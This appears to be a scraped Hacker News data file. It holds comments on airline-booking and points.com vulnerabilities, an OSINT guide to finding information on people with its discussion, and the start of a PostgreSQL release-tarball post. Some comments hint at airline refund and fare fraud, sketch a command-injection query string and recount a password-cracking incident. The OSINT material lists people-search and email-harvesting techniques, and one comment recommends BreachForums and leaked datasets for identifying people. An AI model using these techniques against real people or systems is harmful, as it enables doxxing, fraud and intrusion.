reply rootsudo 13 hours agoprevFun read! So close to unlimited point generation and process tickets for those fancy flights~ I would say if you wanted to generate \"free\" flights, which is entirely possible, learn how GDS works and the workflow for a ticket purchase and how a coupon is attached ;) but that would probably be going to far then just normal poking and secure disclosure but there is enough techdebt that if you know how one airline processes a ticket, it will work on quite a few other too! You can also do very tricky things too that would process as normal for a majority of airlines too - event though most airlines may fall onto amadeus/sabre, you'd be surprised (or not really) at the front end that will allow almost anything - and \"farecodes\" that could rewrite a ticket which have been exposed to customer facing endpoints that are best verified, with only an active PNR. Then again, I do recall a famous post on here about australian politician and someone jusing using view source to verify a quantas ticket. reply nucleardog 11 hours agoparent> Then again, I do recall a famous post on here about australian politician and someone jusing using view source to verify a quantas ticket. https://mango.pdf.zone/finding-former-australian-prime-minis... No \"view source\" level hackery, but presumably what you're referring to. reply moritonal 11 hours agorootparent\"Right click > Inspect Element, all you need to subvert the Commonwealth of Australia\" reply sushid 13 hours agoparentprevCan you provide a link or two so one could read up on what you've mentioned in your post? reply klausa 12 hours agorootparentA lot of the knowledge is very arcane, and like, split over hundreds and thousands of flyertalk.com pages, and like... institutional knowledge of more clever travel agents. I think a lot of the \"fun\" that can potentially be had also requires a direct access to a GDS, which, AFAICT is on the order of ~$10k a year? And if your \"tricks\" are discovered, airlines have a direct way to demand payment for any shenanigans you've pulled (ADM, https://www.ana.co.jp/businesspartners/en/admacm-policy/). But perhaps OP had something different in mind, I'm curious myself now :P If you wanna really go off the deep end, try looking into \"fuel dumping\" community — there's a small group of people who basically have figured out a series of bugs in how fares are coded (that lets them buy flights much cheaper then intended). They use (very dumb) coded language to talk about their \"findings\", and are very very very unfriendly to newcomers; but it's a fascinating world to observe. reply Beijinger 9 hours agorootparentI thought fuel dumping is a thing from the past? I have been able to save USD 500 with a VPN (booked Aeroflot ticket advertised on Russian google with a Russian IP). I am able to read a little bit Cyrillic so I was able to go through the booking. Citibank then blocked my CC and called me. Did everything again and got the ticket for USD 1000 instead of USD 1500. Good experience with switching languages on sites. I was able to buy tickets 80% discounted by switching from English to the native language. reply rootsudo 9 hours agorootparentprevCorrect, it's very arcane knowledge. Revenue manager of any, every airline will catch up to you but some of them are nice. Many are not. :) Direct access to an GDS can also come way of an OTA, which, may not sanitize input properly, or if you learn how bulk purchasing of tickets happen (e.g. if airline is sold out, but it still shows/bookable by an OTA they have access to bulk ticket fares and can sell - sometimes flights close out on the airline but are bookable to last minute on OTA as well.) Flyertalk is a great resource, and also, surprisngly the reason why Whatsapp was created too! - But I wasn't being indicitive of that and knowing what a fare code/y/j/whatever class fare is - I meant that sabre/amadeus and the front end of the airline are really \"broken\", and you can do similar things to what the original article posted, even abusive things like \"walk\" for tickets to refund to an airline hosted \"Wallet\" (usually you can attach a PNR and reuse it and rebook a new PNR/Ticket) which can break the chain and require someone at revenue management to really pull the log for that coupon/PNR to see where the money went, or why someone else flew that segment. You can also double refund - and of course the airline can clawback - if they find out in time. Though many airlines have special gateway relationships w/ banks (as noted by the point system tied to a credit card network) (But this comes down as general fraud.) The fuel dumping community isn't the only one, the reason they are unfriendly to newcomers is because they think they got a neat trick and they do, and once it hits front page news, that fare/date is dead. But there are other communities similar too - there is the staff travel/non revenue community which flies for free*, buddy passes, companion passes or on Zed90 tickets which is standby travel on OAL, other airlines (though you need to be listed/included on someones benefits.) and travel industry IATA or something - and thats the thing, if you can get access to a GDS and encode fares you may be able to list yourself but these aren't normally commercial fares, but I've seen many times a GDS spit out wrong class, class mismatch, fare/class mismatch, etc that wouldn't be a mistake fare per se, but a misconfiguration or a unsantized input that did this :) But also, some GDS's are also nto that locked up, you can find some on shodan if you know the right keywords and literally poll someones name to see if they have any active flights, etc. I'm not encouring anyone to go find them, but if you know what to look for, there are many insecure or generally not behind any login page that opens up to a general query and allows reservations and confirmed commercial fares - but that falls down to just poor IT security operations in general vs GDS flaw. tl;dr All Airlines front end/ecomm site talks to it's own GDS which are cloud hosted but act like 90's shell programs, some/many ecomm front ends are really bad and you can do stuff you shouldn't. It all comes down to your identity and is all tracable which is why many of these flaws still exist, because it's enforcable the other way/tech debt to fix is too much. And we haven't even got into SSR codes, OSI codes, etc reply ramses0 3 hours agorootparent...to demystify some of what's being said: Imagine buyFlights.php?bash=\"cp+foo+bar;mv+bar+baz;etc...\" Then imagine: buyFlights.php?sabre=\"1DFWSFO12JAN23FEB+etc...\" If you've ever seen your passenger name come back as ALL UPPERCASE, it's likely been washed through the methuselah of systems, and those systems have lots of internal quirks and commands that may let you do things like switch seats, add a car, drop a passenger, change your meal preference, etc. \"some/many ecomm front ends are really bad and you can do stuff you shouldn't\" ...if you pay attention to what's going on \"in the system\", if there's an unprotected endpoint where you can say \"LUNCH=vegetarian&&btw-duplicate-this-flight-then-cancel-and-issue-a-refund-in-cash\", that's (sometimes) the level of badness in the different systems. Historically: SABRE was a spinoff of AA and one of the first real database / computer / IT companies. EaasySabre (ca: 1986!?!!) was one of the first \"credit card over modem\" applications (eg: on Prodigy!) - https://www.travelweekly.com/Travel-News/Travel-Technology/S... ...lots of opportunity for \"legacy\" bugs hiding there. reply throwawaysleep 10 hours agoparentprevAny recommended resources for learning GDS? reply ZephyrBlu 11 hours agoprevInsane vulnerabilities. The massive mismatches between authentication and authorization scopes are crazy. Encrypting data with \"secret\" as the key is also a facepalm. reply jsemrau 11 hours agoparentSomeone didn't bother reading my carefully prepared memo on commonly-used passwords. Now, then, as I so meticulously pointed out, the four most-used passwords are: love, sex, secret, and... reply dawnerd 10 hours agorootparentAges ago I was tasked with migrating a site for a famous workout instructor. I noticed they stored passwords in plain text. His along with a shocking number of user accounts all used just his first name as the password. reply S04dKHzrKT 11 hours agorootparentprevhunter2 reply Phemist 11 hours agorootparentYou are being downvoted because your comment only shows up as ****, which is not a significant contribution to the conversation. reply bankcust08385 11 hours agorootparentprevSo would your holiness care to change her password? Once upon a time, I ran ypcat passwd and piped it into John the Ripper on the CompSci Linux cluster at one of the University of California campuses. Within 90s, I had amassed passwords of over 40 users including several lecturers and a tenured professor. The CS IT shop's mistake was running NIS+ rather than something like LDAP + Kerberos. Edit: ... god reply yard2010 10 hours agorootparentprevPassword. The username is Cyril Figgis. reply kalev 11 hours agorootparentprevpassword???? reply wrboyce 11 hours agorootparentprevgod. reply sova 6 hours agoprevIt's so funny to me, this is normally read aloud as \"security vulnerabilities disclosed after patching\" but in reality this is a natural part of how software is made. You make compromises. Terrible ones. Security ones. In the beginning. Not always, but some places, some applications, some websites, some languages, sometimes you make some concessions for sake of simplicity or prototyping or proof-of-concept'ing that ends up making it all the way to prod. And then these \"vulnerabilities\" are really things that mean your company grew way faster than you anticipated, and lucky for you some ethical hackers \"exploited\" these concessions, first. reply matteason 10 hours agoprev [–] This is only tangentially related but it always blows my mind how insecure airline booking portals are. For many (most?) airlines all you need is the booking reference (PNR number) and surname to log in and see flight itinerary, contact details and, in some cases, change or cancel the booking. No password or MFA needed. The kicker is that your PNR number and surname are encoded in the barcode on your boarding pass, easily scannable with a phone app. If you ever post a boarding pass online you're unintentionally doxxing yourself and potentially letting people screw with your flights. I've seen celebrities do this, and during the Cloudstrike outage one tech CEO posted his handwritten boarding pass on Twitter with the PNR in full view. https://krebsonsecurity.com/2017/08/why-its-still-a-bad-idea... reply fer 9 hours agoparentThe issue here is interoperability. PNR identifier and last name is the only reasonable key to use when a single PNR is meant to be shared among the GDS, the IT provider, the traveler and companions, hotels, car rentals companies, travel agencies and countless other players in the market (sometimes several of each at the same time). But it's also true it relies on the traveler keeping the PNR reference secret. Adding MFA would involve adding new segments to all sorts of EDI messages, more complex booking/ticketing/cancelling flows, and getting all those companies on the same page so shit works without impact. It'd be possible and an impressive engineering effort, but also a royal PITA given all the moving parts in the travel industry. The few times I had to cancel/rebook or similar I was next to the counter with my ID, but I can think that having people call you and/or send an email for you to click to confirm is easier and has less friction than revamping the whole GDS industry and their (ducks) legacy B2B interoperation. reply IggleSniggle 6 hours agorootparentYou can only imagine the pain of having a \"-\" in your last name, when some documents accept spaces but not hyphens, and some accept hyphens but not spaces, and some accept neither, and some require other identifying documents to match each other... I imagine this is the sort of thing that makes these stay so open. If my flight is cancelled and rebooked with a partner, but my id says \"Last-Name\" and my boarding pass says \"LastName\" and for some reason I'm in the system as just \"Name,\" then it's really nice the I can still make it on my next flight departing in 10 minutes. reply fer 6 hours agorootparentMy name almost always gets trimmed. Here you can see a bit of the interoperational hell: https://xx1.pass-consulting.com/documentation/xx1-travel-sdk... The tech in the travel industry is cursed, and the pay is bad. Do not recommend. reply lowercased 7 hours agoparentprevIt's worse with some. A recent trip had me create an account with an airline - I can log in and see my trips, points, name, etc... but to see the itinerary, I have to have the PNR number, which isn't anywhere in the authenticated portal area. It's only delivered by email, once AFIACT. I thought I'd lost it at first - couldn't find it for a while (went to spam apparently). But... if I'm logged in via user/pass... why would this notion of 'view your itinerary' NOT be available? What security benefit is there? None as far as I could see. reply spi 7 hours agoparentprevI know this is HN and here it's not a popular opinion, but maximum security is _not_ always a good idea. Even setting aside the problem of many different actors having to access these details mentioned below, there's value in a simple login process. Specifically for airplane tickets, the most common ones I had to struggle with multiple times are retrieving reservations bought from a different computer, or by a travel agency. In all these situations, it was exactly the simple approach that saved me. If 2FA was mandatory, the best case scenario was that the travel agency would have to send you a separate e-mail with details about how to access their portal where this 2FA would somehow work. The number of systems multiplies, the number of credentials to remember does, as well. If you are not from your usual workplace (and chances are, if you are travelling, you are not) or from a shaky connection (same), you are in a real problem. In a time-critical scenario, which makes it really worse. Implementing a \"secure\" connection here would be a sure road for pain ahead, at least it would need the airplane company to increase customer support a lot, and likely a lot of bad publicity every time something fails. Delays cost money, especially in this industry. And what would you get for that? The safety that, if you publish a picture of your reservation / boarding pass online, nobody can log in with your credentials and cancel your flight? That's a rather niche and very targeted risk, which is better handled by a single customer support agent who, simply, issues you a new ticket. (by the way, by the time you have checked in and your boarding pass has been issued, a lot of companies just don't allow you to cancel anymore, so it's really a non-issue?) reply dustypotato 9 hours agoparentprevMaybe it was after boarding the flight? I still find it convenient . It's not that hard to keep the PNR number and surname. The reason it's so open is that there's an Identity check at the next stage where you can't use them if you're faking. reply callmeal 9 hours agorootparentThe concern is more about DOSing - using a pnr and last name, you can view (and in some cases, cancel) online via the airlines web site. reply interludead 7 hours agoparentprev [–] It's overlooked security issue in the airline industry. Yet I still haven't encountered such data theft stories (I mean personally) reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Between March and May 2023, multiple security vulnerabilities were discovered in points.com, a major backend provider for airline and hotel rewards programs, potentially exposing sensitive customer data and allowing unauthorized actions.",
      "Key vulnerabilities included directory traversal, authorization bypass, leaked credentials, and weak session secrets, affecting major programs like United MileagePlus and Virgin's rewards program.",
      "Points.com promptly acknowledged and fixed these issues, highlighting the critical impact of high-severity vulnerabilities in essential systems."
    ],
    "commentSummary": [
      "A major security incident involving the largest airline and hotel rewards platform was disclosed, highlighting significant vulnerabilities.",
      "The platform's response to the security reports was notably swift, taking affected sites offline and resolving issues quickly.",
      "One critical vulnerability involved using \"secret\" as the Flask session secret, allowing attackers to gain super administrator permissions."
    ],
    "points": 260,
    "commentCount": 90,
    "retryCount": 0,
    "time": 1723525814
  },
  {
    "id": 41231145,
    "title": "Mastering Osint: How to Find Information on Anyone",
    "originLink": "https://osintteam.blog/mastering-osint-how-to-find-information-on-anyone-680e4086f17f",
    "originBody": "Mastering OSINT: How to Find Information on Anyone Hayden.banz · Follow Published in OSINT Team · 4 min read · 6 days ago -- In today’s digital age, information is more accessible than ever before. Open Source Intelligence (OSINT) collects and analyzes publicly available data to generate actionable intelligence. Whether you are a journalist, investigator, or simply someone curious about a topic, OSINT techniques can help you uncover valuable insights. This article will guide you through the process of finding information on anyone using OSINT methods. Understanding OSINT OSINT leverages data from publicly available sources such as social media, websites, government databases, forums, and more. The key to effective OSINT is knowing where to look and how to analyze the information you find. Here are some essential steps to get you started. Getting started Gather Basic Information Start with the basics. Use search engines like Google to find initial information. Enter the person’s name in quotation marks to get exact matches. Combine the name with other keywords like location, profession, or organization to narrow down the results. Start with What You Know: Identify any piece of information you already have, such as an email, username, or phone number. Define Your Requirements: Clarify what information you seek to gather. Gather the Data: Use various tools and methods to collect information. Analyze Collected Data: Examine the data for patterns and relevant information. Pivot Using New Data: Use newfound information to dig deeper. Validate Assumptions: Cross-check data for accuracy. Generate a Report: Compile your findings into a coherent report. Real Name Searches Governmental Resources Government websites can be a treasure trove of information. Depending on the country, data openness varies, but advanced Google search queries can help locate relevant information. Google Dorks(google dorks) In 2002, Johnny Long started collecting Google search queries, known as Google Dorks, to uncover sensitive information. Here are some useful queries: \"john doe\" site:instagram.com: Exact match search on Instagram. \"john doe\" -\"site:instagram.com/johndoe\" site:instagram.com: Exclude the target’s own account but show their comments on others' posts. \"CV\" OR \"Curriculum Vitae\" filetype:PDF \"john doe\": Find resumes containing \"CV\" or \"Curriculum Vitae\" in PDF format. People Search Websites Use specialized websites for people searches based on real name, username, email, or phone number: spokeo.com thatsthem.com beenverified.com fastpeoplesearch.com truepeoplesearch.com familytreenow.com Username Searches Reverse Username Lookup Websites like socialcatfish.com, usersearch.org, and peekyou.com are valuable for reverse username lookups. Google Dorks for Usernames inurl:johndoe site:instagram.com: Search Instagram URLs containing \"johndoe\". allinurl:john doe ny site:instagram.com: Find pages with specific words in the Instagram URL. Username Search Tools Tools like instantusername.com, namechk.com, and WhatsMyName (a GitHub project) can help locate usernames across multiple platforms. Email Address Searches Google Dorks \"@example.com\" site:example.com: Search for emails on a given domain. HR \"email\" site:example.com filetype:csvfiletype:xlsfiletype:xlsx: Find HR contact lists on a domain. site:example.com intext:@gmail.com filetype:xls: Extract email IDs from a domain. Email Tools Hunter: Scans domain names for email addresses and reveals common patterns. Email Permutator: Generates potential email permutations. Proofy: Bulk email validation. Verifalia: Validates single email addresses. Compromised Databases Websites like haveibeenpwned.com and dehashed.com can help find data breaches involving the target’s email, revealing services they use or have used. Phone Number Searches Social Media Search Entering a phone number into Facebook search might reveal associated profiles. Phone Lookup Services Websites like privacystar.com, getcontact.com, and everycaller.com provide reverse phone lookup services. PhoneInfoga PhoneInfoga is an advanced tool for scanning phone numbers using free resources, providing information such as country, area, carrier, and line type. Domain Name Searches Google Dorks site:example.com: Limits search to a specific domain. filetype:DOC: Returns documents of specified types from the domain. intext:word1: Searches for specific words on a page or website. related:example.com: Lists web pages similar to a specified web page. site:*.example.com: Shows all subdomains. Whois and Reverse Whois Whois services like whois.icann.org and whois.com provide registered user information. Reverse Whois tools like viewdns.info list domains registered with the same organization name or email address. Same IP and Passive DNS Tools like atsameip.intercode.ca and RiskIQ Community Edition reveal other websites on the same server. Passive DNS records show all names resolved to the researched IP. Location Searches Geolocation Tools Tools like Creepy and Echosec gather location data from social networks and image hosting services. IP-Based Geolocation Websites like iplocation.net map IP addresses to geographic locations. Use wigle.net to map Wi-Fi access points. Image Searches Reverse Image Search Use Google Images, Bing Images, and TinEye to perform reverse image searches, identifying where else an image is used and its first appearance. EXIF Data Analysis EXIF data contains camera information and geolocation coordinates. Tools like Exiftool and online services like exifdata.com allow viewing this metadata. SOCMINT Social Media Intelligence (SOCMINT) focuses on data gathering and monitoring from social media platforms. Tools and techniques previously mentioned can help in SOCMINT investigations. Use Specialized Tools There are various OSINT tools available that can enhance your search capabilities. Some popular ones include: Maltego: A powerful tool for mapping out relationships and networks. Spiderfoot: An open-source tool that automates the collection of OSINT data. Recon-ng: A web reconnaissance framework with a range of modules to gather information. Conclusion OSINT offers a wealth of opportunities for uncovering information about anyone, from social media profiles to public records and beyond. By following a structured approach and leveraging specialized tools, you can effectively gather, analyze, and verify information from publicly available sources. Remember to always approach OSINT with ethical considerations in mind, ensuring that your efforts respect privacy and legal boundaries. Whether you’re a professional investigator or a curious individual, mastering OSINT can unlock a world of information at your fingertips. References Google Search Operators: https://support.google.com/websearch/answer/2466433?hl=en Maltego: https://www.maltego.com SpiderFoot: https://www.spiderfoot.net Shodan: https://www.shodan.io By integrating these OSINT techniques and tools into your research process, you’ll be well-equipped to find detailed and accurate information on anyone, enhancing your investigative capabilities in the digital age.",
    "commentLink": "https://news.ycombinator.com/item?id=41231145",
    "commentBody": "Mastering Osint: How to Find Information on Anyone (osintteam.blog)212 points by droidrat 17 hours agohidepastfavorite45 comments throwup238 15 hours agoSWIM's recommendation for anyone wanting to learn is to sign up for Breachforum and read up on all of the contents in their OSINT subforum [1] where you can ask questions too. If you're willing to boogey on into the grey area, you can even download leaked datasets from BreachForum, Leakbase.io, etc. to make your job a lot easier if it involves identifying people online - for example a few databases like AT&T customers and the NationalPublicData database were leaked recently which is kind of like having a private LexisNexis Accurint at your fingertips. [1] https://breachforums.st/Forum-OSINT reply graemep 10 hours agoparentA site with a \"grey area\", which does not work without running a third party Javascript, and hosted in in Russia makes me a bit twitchy. reply khafra 10 hours agorootparentThis is definitely a topic area where people overly familiar might omit standard safety precautions within their instructions: Do use a burner VM, don't do any of your normal computing on that VM, etc. reply trallnag 8 hours agorootparentprevIn the current environment it is tough to host things like that on the clearnet and not rely on \"shady\" hosting in Russia and similar nations reply hoseja 6 hours agorootparentprevIt really creates a weird cognitive dissonance in me to observe how a lot of useful stuff is hosted in russia. reply sulandor 8 hours agorootparentprevyou'll get over it reply kid64 5 hours agoparentprevIsn't that site now under FBI control? https://www.justice.gov/opa/pr/justice-department-announces-... reply zoklet-enjoyer 6 hours agoparentprevSomeone who is me reply runald 5 hours agoprevSome funny anecdote, my fullname is relatively unique, two or three people have it AFAIK. On my upwork profile, they put the military veteran status because a completely unrelated military guy with the same name shows up in the google/linkedin search. I can't remove the status, I don't even look like the other guy. reply 8organicbits 4 hours agoparentIn some countries, falsely claiming military status is a crime. I'd be very careful about accepting any jobs using that profile as you may be committing fraud. (Not a lawyer) reply runald 3 hours agorootparentThanks for the heads-up. Not aware of any law like that from where I live, but I should file a ticket to remove the veteran status just in case. reply blantonl 5 hours agoparentprevForced valor reply alabhyajindal 14 hours agoprevI never liked this term. Why is the term \"Open Source\" used to refer to publicly available information? Something like \"PAT\" would have been a better acronym: Public Available Information. Do we refer to street dogs as open source dogs? reply lakrhN 9 hours agoparentPAI would sound like anyone had the right to the information, whereas OS sounds like it happens to be public (unfortunately), but of course only we the agencies should access it. OS is a bureaucratic power term, which is of course quite old: https://en.wikipedia.org/wiki/Open-source_intelligence#Histo... reply abhaynayar 14 hours agoparentprevOr PINT: Public INT. reply elib-at 12 hours agorootparent... I called it Public Intelligence (PubInt) reply lucideer 5 hours agoparentprev> I never liked this term. Why is the term \"Open Source\" used to refer to publicly available information? I assume your line of thinking is that you associate \"Open Source\" with software freedom (warm fuzzy feelings) & dislike that being tainted by stalkers & military espionage. Leaving aside that OSINT pre-dates the software term, I think it's quite fitting given the context of the very capitalist-/corporate-friendly \"Open Source\" licensing trend subsuming the original corporate-unfriendly/copyleft \"Free Software\" movement. The former enables the military-industrial complex by taking advantage of publicly available data, the latter enables the corporate world by taking advantage of publicly available code. reply normie3000 12 hours agoparentprev> \"PAT\" would have been a better acronym: Public Available Information. informaTion? > Do we refer to street dogs as open source dogs? No, but we don't call them Public Available Dogs either. reply ron_k 12 hours agorootparent“Stray information” sounds good, though. reply alabhyajindal 12 hours agorootparentprevMy bad - messed up the acronym! reply normie3000 12 hours agorootparentPAI might be a bit close to PII.. although I guess there would be overlap :) reply elib-at 11 hours agoparentprev...this takes me down a rabbit hole to 2010. We once tried to establish \"Public Intelligence\" [PubInt] as it was a term we used since 2003 in 2010 but it only caught on with some businesses. The then definition was - to differenciate it from OSINT - bound to the use of the information in a \"civic\" context - here you got them for fun and giggles: 2003: Public intelligence refers to sources of information freely available to the individual to be the basis for it's role as a responsible and critical citizen as part of a group or state. Public Intelligence is associated with the application of Open source intelligence (OSInt) to empower the public in its dealings with all forms of organization, and most especially government. It is an applied variant of Collective intelligence. It was inspired by the 1978 Colby book: \"Intelligence must accept the end of its special status in the American government, and take on the task of informing the public of its nature and its activities as any other department or agency. . . . By far the most effective manner of accomplishing the task . . . is by letting the public benefit directly from the products of intelligence, its information and assessments. \" --former DCI William Colby, Honorable Men: My Life in the CIA, Simon & Schuster, 1978, pp. 459-60. I put it together for your viewing pleasure: https://elib.at/index.php?title=Public_Intelligence_-_Glossa... enjoy edit:typos reply lucideer 8 hours agorootparentThe problem with this is that OSINT has been established as a term at a government level (likely before Open Source Software came about?), so any push to change it will be a greater feat than the inverse. reply fmbb 7 hours agoparentprevThe term invariably seems to apply to two phenomenons: 1. Stalkers stalking people 2. Actors spreading misinformation on X about wartime atrocities I can see why they want to brand their stuff “Open Source” which sounds like a good thing. reply didntcheck 6 hours agorootparentYes, unfortunately I've also observed that while \"OSINT\" is theoretically a legitimate, white-hat thing, in practice it's very often used as whitewashed branding for malicious (often \"righteous\") doxxing. Similar to black hats for hire forums that claim to just be about \"security research\" reply phito 9 hours agoparentprevPlease no more acronyms reply Y_Y 7 hours agorootparentPNMA reply randomdata 13 hours agoparentprev> Why is the term \"Open Source\" used to refer to publicly available information? Well, why not? \"Source\" has long referred to available information. In fact, you probably won't have to read HN long before you encounter a \"source plz\"-type meme, intended to mean something akin to: \"Please point me to the available information that supports your claim.\" \"Open\" has long referred to available information that is accessible to users. \"Open source[code]\" uses \"open\" in the same way. PAT works too but I'm not sure it communicates anything meaningfully different. As far as I can tell, they are trying to communicate the very same thing. Is your reaction, perhaps, because you are accustomed to \"open source\" being used in the software sense? > Do we refer to street dogs as open source dogs? Dogs haven't typically been seen as information, so, for all practical purposes, probably not. But if we want to change that, sure, why not? Language doesn't have feelings. It doesn't care. reply alabhyajindal 12 hours agorootparentI agree that individually those terms convey the exact thing as publicly available information. > Is your reaction, perhaps, because you are accustomed to \"open source\" being used in the software sense? Yes exactly. I feel like a different term should be used here, because open source is already a widely established term in software. reply klez 9 hours agorootparentThe term \"open source\" as referring to sofware was suggested in 1997 but I could find references to OSINT from at least 1991-1995[0], so I'd say \"Open Source Intelligence\" should get precedence. [0] https://apps.dtic.mil/sti/tr/pdf/ADB194025.pdf reply soco 10 hours agorootparentprevThe thing is, there's a whole world outside software development and as unpleasant as it might sound, they don't care that much what words we use among us. reply eleveriven 6 hours agoparentprevThe idea is about openness and collaboration reply rbanffy 7 hours agoprevWhen it’s impossible to prevent bad actors from gaining access to weapons, the best thing to do is to level the field by giving the same weapons to everyone. It’s kind of mad. reply blantonl 4 hours agoprevThere was a command line tool available where you could enter a few attributes (such as a username) and the tool would plow through just about every online service to find and report data. Anyone remember what it was? reply binarysneaker 4 hours agoparenthttps://github.com/sherlock-project/sherlock reply webdevver 4 hours agoparentprevperhaps 'sherlock'? https://github.com/sherlock-project/sherlock reply blantonl 4 hours agorootparentyup, this was it. Thanks! reply robertclaus 14 hours agoprevI couldn't get those Google searches to find my resume. I wonder if I was doing something wrong... reply dosinga 7 hours agoparentYou called it Work Experience is that why maybe? reply Flatcircle 5 hours agoprevIt’s shockingly easy to find information about almost anyone within the first couple pages of google reply xyst 5 hours agoparentand even if there’s no information on the first and last name. There will likely be at least somebody in your web of relationships that leaked something. reply Duckyroad 6 hours agoprevFrom my impression, the way you get good at OSINT is knowing which types of information tend to be related, and where to go with what you have. All OSINT guides include a surprising amount of paid tools. OSINT tools are dime a dozen, you have to know how to use them. Finding tools is easy, there are endless collections of them: - https://osintframework.com/ - https://github.com/jivoi/awesome-osint - https://cylect.io/ The hard part is deciding when, where, how, and with what information to use them. I am surprised how little information about OSINT is on hackernews (https://hn.algolia.com/?query=OSINT barely has results) If you are not some journalist, you won't need serious OSINT. (Investigating someone for fun?) You can play geoguesser for fun. That's \"technically\" OSINT and you will know geography. Here is a Geoguesser (Rainbolt) player finding places from images: https://www.youtube.com/@georainbolt/videos Here are some OSINT challenges if you want: https://gralhix.com/list-of-osint-exercises/ A skill I recommend much more than OSINT is being good at normal searching and collecting some basic metadata, and getting the gist of new topics quickly. - You want to buy something, how do you figure out the price, quality, and whether it is a good deal. How to quickly figure out what matters and what doesn't? Which features are common, which false advertised, which are aesthetic bloat. - You are traveling or moving to a new city, how do you quickly figure out all the tricks locals know and not fall for tourist cash grabs. - You find a shady website, app, or chrome extension. Pocke around with the source code and domain names to round up the entire operation and report it. - Some new person you got to know works/likes something you know little about. How do you quickly figure out some deeper questions to ask. - Find what an error in your computer. It boils down to knowing the underlying structure of whatever you are digging. Insiders tend to know ecosystem so well it seems obvious, despite it being hard to integrate into for an outsider. reply kcaseg 5 hours agoprev [–] \"Gather the Data: Use various tools and methods to collect information.\" \"By following a structured approach and leveraging specialized tools, you can effectively gather, analyze, and verify information from publicly available sources.\" Am I paranoid or was this partly written by an LLM? Or is it just naturally so vague and generic. I mean most of the tips are kinda legit, but after the title I expected a little more than this. reply r721 1 hour agoparentI checked who else submitted osintteam.blog domain, and it's user https://news.ycombinator.com/user?id=haydenbannz , and it looks like they used HN mostly for self-promotion: https://news.ycombinator.com/submitted?id=haydenbannz (some posts are [dead]). reply klez 5 hours agoparentprev [–] Frankly I got that impression too, but more because of the structure of the post than anything else. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The article provides a comprehensive guide on using Open Source Intelligence (OSINT) to find information on individuals by leveraging publicly available data from various sources like social media, websites, and government databases.",
      "It outlines key steps in the OSINT process, including gathering basic information, defining requirements, analyzing data, validating assumptions, and generating reports, while emphasizing the ethical use of these methods.",
      "Specialized tools and techniques such as Google Dorks, reverse username lookup, email tools, and geolocation tools are highlighted to aid in the efficient collection and analysis of data."
    ],
    "commentSummary": [
      "The post discusses mastering OSINT (Open Source Intelligence) and suggests signing up for Breachforum to access leaked datasets, but cautions about the site's Russian hosting and potential security risks.",
      "It highlights the importance of understanding how to use OSINT tools like Sherlock effectively and suggests alternative terms for OSINT, such as \"Public Available Information\" (PAI) or \"Public Intelligence\" (PubInt).",
      "The post provides additional resources for learning OSINT, including osintframework.com and github.com/jivoi/awesome-osint, and notes that OSINT is valuable for journalists and investigators, while casual users should focus on effective searching and metadata understanding."
    ],
    "points": 212,
    "commentCount": 45,
    "retryCount": 0,
    "time": 1723511016
  },
  {
    "id": 41232621,
    "title": "The new PostgreSQL 17 make dist",
    "originLink": "http://peter.eisentraut.org/blog/2024/08/13/the-new-postgresql-17-make-dist",
    "originBody": "The new PostgreSQL 17 make dist Aug 13, 2024 When the PostgreSQL project makes a release, the primary artifact of that is the publication of a source code tarball. That represents the output of all the work that went into the creation of the PostgreSQL software up to the point of the release. The source tarball is then used downstream by packagers to make binary packages (or file system images or installation scripts or similar things), or by some to build the software from source by hand. Creating a source code tarball is actually quite tricky to do by hand. Of course, you could just run “tar” over a currently checked out source tree. But you need to be careful that the checkout is clean and not locally modified. You need to ensure that all the files that belong in the tarball end up there and no other files. There are certain source control files that you don’t want to include in the tarball. File permissions and file ownership need to be sane. And all this should work consistently across platforms and across time. Fortunately, this has all been scripted and has been pretty reliable over the years. Additionally, a PostgreSQL source code tarball has included various prebuilt files. These are files that are not actually part of the source code checked into Git, but they would be built as part of a normal compilation. For example, a source code tarball has included prebuilt Bison and Flex files, various .c and .h files generated by Perl scripts, and HTML and man page documentation built from DocBook XML files. The reason for this is a mix of convenience and traditional practice. All these output files are platform-independent and independent of build options. So everyone will get the same ones anyway, so we might as well prebuild them. Also, that way, users of the source tarball won’t need the tools to build these files. For example, you didn’t actually need Perl to build PostgreSQL from a source tarball, because all the files generated from Perl scripts were already built. Also, historically (very historically), PostgreSQL was pushing the limits of Bison and Flex (or various other yacc and lex implementations, when those were still supported), so it was convenient and less error-prone to give everyone the same prebuilt Bison and Flex output files. This system has two major problems that have now led to the point that we got rid of it in PostgreSQL 17. First, implementing and maintaining this arrangement in the build system is quite tricky. You need to carefully maintain the different states of “clean source code”, “partially built source code”, and “fully built source code”, and the commands to transition between them. (This was make distprep and make all, and then make clean and make maintainer-clean to move the other way.) Making it work with out-of-tree (“vpath”) builds was extremely weird: If you built from a source tarball, the Bison (etc.) output files were in the source directory, but if you build from a Git checkout, the Bison output files were in the build directory, and you need to support both of these sanely. Finally, the new Meson build system is extremely allergic against writing build output into the source directory. Some of the historical reasons are also obsolete. It’s not a problem anymore to get a good version of Bison and Flex installed. Everybody can easily get Perl installed nowadays. The documentation build can still be a bit tricky, but it’s generally much easier and robust than a few decades ago. Second, a lot more attention is nowadays paid to the software supply chain. There are security and legal reasons for this. When users install software, they want to know where it came from, and they want to be sure that they got the right thing, not some fake version or some version of dubious legal provenance. The downstream packaging practice has already paid attention to this for many years. Packages or package repositories are cryptographically signed, so you can be sure that what you install came from a trustworthy source. There have also been efforts to make binary builds reproducible, so that you can be sure that the binary files in your binary package are what you’d expect them to be. Some packagers have policies that everything needs to be built from source, so they’d just delete and rebuild the prebuilt files anyway. At the other end of the software production pipeline, using Git as the source control system gives some integrity guarantees that you are getting the same source code that everybody else is getting. So if I’m looking at commit b18b3a8150dbb150124bd345e000d6dc92f3d6dd and I see that same commit on various public servers, that’s probably the same commit that everybody else is seeing. And I can check what the parents of that commit are and how the code got to that point and so on. But what we didn’t have until now is a transparent and reproducible way to get from that commit to the release tarball. The way the tarball creation works is that the person who prepares the release runs make dist on a machine that is specially kept “clean” for that purpose. How can a third party verify this process? The produced tarball was not perfectly reproducible. If you run make dist yourself, you’ll get a similar but not identical tarball. A way to verify whether a tarball was sane was to unpack it and diff the contents against a source directory or an unpacked tarball that you made yourself. But this requires manual judgment. The Bison and Flex files won’t be the same unless you used the identical versions. The built documentation also won’t be perfectly identical. File timestamps will be different. Also you’d need to carefully check manually whether files are missing or too many. This was not fully satisfactory. (This work overlapped with the discovery of the XZ Utils backdoor, which exploited (among other things) exactly this non-reproducible tarball creation process. But I want to be clear that this is a complete coincidence, and this work was neither done as a response to 